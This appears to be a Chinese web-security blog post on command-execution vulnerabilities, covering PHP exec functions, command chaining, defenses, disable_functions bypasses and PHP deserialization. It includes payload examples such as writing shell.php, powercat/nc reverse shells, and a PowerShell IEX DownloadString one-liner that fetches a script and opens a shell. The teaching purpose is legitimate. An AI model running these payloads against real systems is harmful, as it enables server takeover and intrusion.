@@ -1,0 +1,1128 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>命令执行</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="命令执行">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-08-05">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-08-12">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="命令执行">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      命令执行
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-08-05T04:48:42.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-08-05</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          Web渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>2.5k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+            class="post-meta-link">
+            命令执行
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="一、漏洞的原因及本质"><a href="#一、漏洞的原因及本质" class="headerlink" title="一、漏洞的原因及本质"></a>一、漏洞的原因及本质</h1><p>代码层过滤不严，应用程序直接或间接使用了动态执行命令的危险函数，并且这个函数的运行参数是可控的。当服务器没有严格过滤用户提供的参数时，就有可能导致用户提交恶意代码被服务器执行，从而造成命令执行漏洞。</p>
+<p><strong>涉及到的函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">system</td>
+<td align="left">能够将字符串作为OS命令执行，自带输出功能</td>
+</tr>
+<tr>
+<td align="left">exec()</td>
+<td align="left">能将字符串作为OS命令执行，但无输出，需要输出执行结果 注意：只输出最后一行数据</td>
+</tr>
+<tr>
+<td align="left">shell_exec()</td>
+<td align="left">执行命令并以字符串的形式，返回完整的信息，但是函数无回显，需要输出执行结果</td>
+</tr>
+<tr>
+<td align="left">passthru()</td>
+<td align="left">执行外部命令，与exec()类似，但是该函数会直接将结果输出，无需输出执行</td>
+</tr>
+<tr>
+<td align="left">popen()</td>
+<td align="left">打开并运行一个程序文件，返回一个文件指针</td>
+</tr>
+<tr>
+<td align="left">反引号（``）</td>
+<td align="left">反引号[``]内的字符串，也会被解析成OS命令</td>
+</tr>
+</tbody></table>
+<h1 id="二、命令执行漏洞的危害"><a href="#二、命令执行漏洞的危害" class="headerlink" title="二、命令执行漏洞的危害"></a>二、命令执行漏洞的危害</h1><p>1、继承Web服务器程序权限（Web用户权限），去执行系统命令</p>
+<p>2、继承Web服务器权限，读写文件</p>
+<p>3、反弹Shell</p>
+<p>4、控制整个网站</p>
+<p>5、控制整个服务器</p>
+<p><strong>利用</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">查看系统文件</td>
+<td align="left">payload：[?cmd=typec:\windows\system32\drivers\etc\hosts] 查看系统hosts文件</td>
+</tr>
+<tr>
+<td align="left">显示当前路径</td>
+<td align="left">payload：[?cmd=cd]</td>
+</tr>
+<tr>
+<td align="left">显示当前权限</td>
+<td align="left">payload：[?cmd=whoami]</td>
+</tr>
+<tr>
+<td align="left">写文件</td>
+<td align="left">payload：[?cmd=echo”“&gt;C:\phpStudy\WWW\Commmandi\shell.php] 页面没有报错，说明文件写入成功</td>
+</tr>
+</tbody></table>
+<h1 id="三、命令执行语法"><a href="#三、命令执行语法" class="headerlink" title="三、命令执行语法"></a>三、命令执行语法</h1><p>Windows</p>
+<table>
+<thead>
+<tr>
+<th align="left">命令格式</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">command1 &amp; command2</td>
+<td align="left">挂起，同时执行Command1和command2，无论command1执行是否成功都执行cmmand2</td>
+</tr>
+<tr>
+<td align="left">command1 &amp;&amp; command2</td>
+<td align="left">且，先后执行Command1和command2，只有command1执行成功时才执行command2</td>
+</tr>
+<tr>
+<td align="left">command1 || command2</td>
+<td align="left">或，先后执行Command1和command2，只有command1执行失败时才执行command2</td>
+</tr>
+<tr>
+<td align="left">command1 | command2</td>
+<td align="left">管道符，将command1的执行结果传递给command2</td>
+</tr>
+</tbody></table>
+<p>Linux</p>
+<table>
+<thead>
+<tr>
+<th align="left">命令格式</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">command1 ; command2</td>
+<td align="left">分隔，先后执行Command1和command2，各自无影响</td>
+</tr>
+<tr>
+<td align="left">command1 &amp; command2</td>
+<td align="left">挂起，同时执行Command1和command2，无论command1执行是否成功都执行cmmand2</td>
+</tr>
+<tr>
+<td align="left">command1 &amp;&amp; command2</td>
+<td align="left">且，先后执行Command1和command2，只有command1执行成功时才执行command2</td>
+</tr>
+<tr>
+<td align="left">command1 || command2</td>
+<td align="left">或，先后执行Command1和command2，只有command1执行失败时才执行command2</td>
+</tr>
+<tr>
+<td align="left">command1 | command2</td>
+<td align="left">管道符，将command1的执行结果传递给command2</td>
+</tr>
+<tr>
+<td align="left">command1.<code>command2</code></td>
+<td align="left">反引号(“``”)，优先执行,无论command1是否执行成功</td>
+</tr>
+</tbody></table>
+<h1 id="四、命令执行漏洞的防御"><a href="#四、命令执行漏洞的防御" class="headerlink" title="四、命令执行漏洞的防御"></a>四、命令执行漏洞的防御</h1><p>1、尽量少使用执行命令函数或者禁用disable_functions</p>
+<p>2、在进入执行命令的函数之前，对参数进行过滤，对敏感字符进行转义</p>
+<p>3、参数值尽量使用引号包括，并在拼接前调用addslashes进行转义</p>
+<p>注：windows写入用单引号，linux用双引号。</p>
+<h1 id="五、反弹shell"><a href="#五、反弹shell" class="headerlink" title="五、反弹shell"></a>五、反弹shell</h1><p>正向shell–不可控，但是不受网络环境影响（自己内网连接目标公网）</p>
+<p>控制端-&gt;被控端，被控端需要开启监听（被控端防火墙、端口开启等难度大，不建议）</p>
+<pre class="highlight"><span class="line">powercat -l -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">nc x.x.x.x 8888</span><br></pre>
+
+<p>反弹shel–可控，但是需要网络可达（目标内网连接自己公网）</p>
+<p>被控端-&gt;控制端，控制端开启监听可控，被控端只需要连接即可，容易实现</p>
+<p>注：无论是哪种shell，都是控制端控制被控端。</p>
+<pre class="highlight"><span class="line">powercat -c x.x.x.x -p 8888 -e cmd</span><br><span class="line"></span><br><span class="line">nc -lnvp 8888</span><br></pre>
+
+<p>powershell程序反弹shell</p>
+<p>(程序为powershell函数，让目标服务器可以执行powershell命令)</p>
+<p>从本地上传脚本</p>
+<pre class="highlight"><span class="line">powershell.exe -exec bypass -Command &quot;Import-Module C:\powercat.ps1;powercat -c x.x.x.x -p 8888 -e cmd&quot;</span><br></pre>
+
+<p>从公网服务器下载脚本</p>
+<pre class="highlight"><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://192.168.21.66:8000/windows/powercat.ps1&#x27;);powercat -c 192.168.21.66 -p 8888 -e cmd</span><br></pre>
+
+<p>详见反弹shell归纳笔记。</p>
+<h1 id="六、绕过disable-functions"><a href="#六、绕过disable-functions" class="headerlink" title="六、绕过disable functions"></a>六、绕过disable functions</h1><p>disable_functions是在/etc/php/apache2/php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数</p>
+<p>通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等</p>
+<p>phpinfo中为disable functions，默认为空，可以通过修改配置文件php.ini进行设置</p>
+<p>如果disable functions被启用，即使拿到webshell，命令执行依然受到限制</p>
+<p>绕过方法</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">常规绕过： exec,shell_exec,system,passthru,popen,proc_open</td>
+<td align="left">黑名单不全绕过 （蚁剑自带黑名单绕过）</td>
+</tr>
+<tr>
+<td align="left">利用环境变量LD_PRELOAD绕过（重要） LD_PRELOAD是Linux系统的下的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库。 通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件，so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的</td>
+<td align="left">前提条件 <br>1、能够上传自己的.so文件 <br>2、能够控制环境变量的值（设置LD_PRELOAD变量），比如putenv函数 <br>3、存在mail()、imap_mail()、mb_send_mail()和error_log()等可以控制PHP启动外部程序并能执行的函数  <br><br>利用过程 <br>1、首先，能够上传恶意.so文件，.so文件由攻击者在本地使用与服务端相近的系统环境进行编译，该库中重写了相关系统函数，重写的系统函数能够被PHP中未被disable_functions禁止的函数所调用 <br>2、能够设置环境变量，比如putenv函数未被禁止，就可以把LD_PRELOAD变量设置为恶意.so文件的路径，只要启动新的进程就会在新进程运行前优先加载该恶意.so文件，导致恶意代码就被注入到程序中 <br>3、当执行未被禁止的PHP函数，并且该函数调用了恶意库中重写的系统函数，就可以达到任意执行系统命令的效果了，因为重写的系统函数中的内容是我们可控的，对这部分内容进行编程即可</td>
+</tr>
+<tr>
+<td align="left">利用pcntl_exec绕过</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">利用imap_open函数任意命令执行(CVE-2018-19518)</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">利用系统组件window com绕过 COM组件它最早的设计意图是，跨语言实现程序组件的复用 COM组件由以Win32动态连接库（DLL）或可执行文件（EXE）形式发布的可执行代码所组成，遵循COM规范编写出来的组件将能够满足对组件架构的所有要求</td>
+<td align="left">前提条件 <br>1、php版本为5.4，高版本扩展要自己添加 <br>2、要在php.ini中开启extension=php_com_dotnet.dll 函数： <br>exec(“cmd /c”.$command); <br>$stdout = $exec-&gt;StdOut(); $stringput = $stdout-&gt;ReadALL(); <br>print($stringput); ?&gt; <br><br>使用： <br>com.php?shell=whoami</td>
+</tr>
+<tr>
+<td align="left">利用Apache+mod_cgi+.htaccess绕过 ModCGI把PHP做为APACHE一个内置模块，让apachehttp服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP，它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行。 .htaccess文件中可以定制用户定义标识头，如果添加Options+ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本，添加AddHandlercgi-script.cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序</td>
+<td align="left">前提条件 <br>1、启用mod-cgi <br>2、.htaccess可写 <br>3、保证.htaccess可以加载进当前web环境。当apache配置文件中指定web目录下AllowOverride参数值为None时，.htaccess文件无法生效</td>
+</tr>
+<tr>
+<td align="left">利用ImageMagick漏洞绕过</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">利用PHP7.4的FFI绕过利用ShellShock绕过(CVE-2014-6271)</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left">利用蚁剑插件绕过</td>
+<td align="left">加载插件-&gt;辅助管理-&gt;绕过disable_functions</td>
+</tr>
+</tbody></table>
+<h1 id="七、反序列化漏洞"><a href="#七、反序列化漏洞" class="headerlink" title="七、反序列化漏洞"></a>七、反序列化漏洞</h1><p>将对象的状态信息转换为可以存储或传输的形式（字符串）的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。简单的说，序列化就是把一个对象变成可以传输的字符串，可以以特定的格式在进程之间跨平台、安全的进行通信。</p>
+<p><strong>序列化的用途</strong></p>
+<p>方便对象在网络中的传输与存储</p>
+<p><strong>序列化与反序列化的过程：</strong></p>
+<p>序列化：将对象转换为流，利于储存和传输的格式</p>
+<p>反序列化：将流转换为对象</p>
+<p><strong>PHP反序列化</strong></p>
+<p>PHP对象类型数据，反序列化之前，需要对反序列化对象提前定义。</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">serialize($a)</td>
+<td align="left">序列化</td>
+</tr>
+<tr>
+<td align="left">unserialize($a)</td>
+<td align="left">反序列化</td>
+</tr>
+</tbody></table>
+<p><strong>形成原因：</strong></p>
+<p>程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。反序列化漏洞并不是PHP特有，也存在于Java、Python等语言之中，但其原理基本相通。</p>
+<p><strong>常见的魔法函数介绍</strong></p>
+<p>序列化本身并不存在任何漏洞，但是搭配上PHP的魔法函数，整个程序的执行流程就将变得可控</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">__construct()</td>
+<td align="left">当一个对象创建时被调用（相当于c++的构造函数）</td>
+</tr>
+<tr>
+<td align="left">__destruct()</td>
+<td align="left">当一个对象销毁时被调用（相当于c++的析构函数）</td>
+</tr>
+<tr>
+<td align="left">__sleep()</td>
+<td align="left">在对象被序列化之前被调用</td>
+</tr>
+<tr>
+<td align="left">__weakup()</td>
+<td align="left">将在unserialize()函数执行反序列化时调用。</td>
+</tr>
+<tr>
+<td align="left">__toString()</td>
+<td align="left">当一个对象被当作一个字符串时使用</td>
+</tr>
+</tbody></table>
+<p><strong>注意：</strong></p>
+<p>PHP的反序列化漏洞需要与其他漏洞配合，比如代码执行、代码执行等。</p>
+<p><strong>防御：</strong></p>
+<p>1、要严格过滤用户输入的unserialize函数的参数</p>
+<p>2、要对unserialize后的变量内容进行检查，以确定内容没有被污染</p>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+            https://www.zerochen.top/article/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/article/XSS/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">XSS </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/Nosql%E6%B3%A8%E5%85%A5/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">Nosql注入 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E6%9C%AC%E8%B4%A8"><span class="toc-text">一、漏洞的原因及本质</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、命令执行漏洞的危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%AD%E6%B3%95"><span class="toc-text">三、命令执行语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-text">四、命令执行漏洞的防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">五、反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E7%BB%95%E8%BF%87disable-functions"><span class="toc-text">六、绕过disable functions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">七、反序列化漏洞</span></a></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>43</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>9</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>43</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E6%9C%AC%E8%B4%A8"><span class="toc-text">一、漏洞的原因及本质</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">二、命令执行漏洞的危害</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%AD%E6%B3%95"><span class="toc-text">三、命令执行语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-text">四、命令执行漏洞的防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">五、反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E7%BB%95%E8%BF%87disable-functions"><span class="toc-text">六、绕过disable functions</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">七、反序列化漏洞</span></a></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
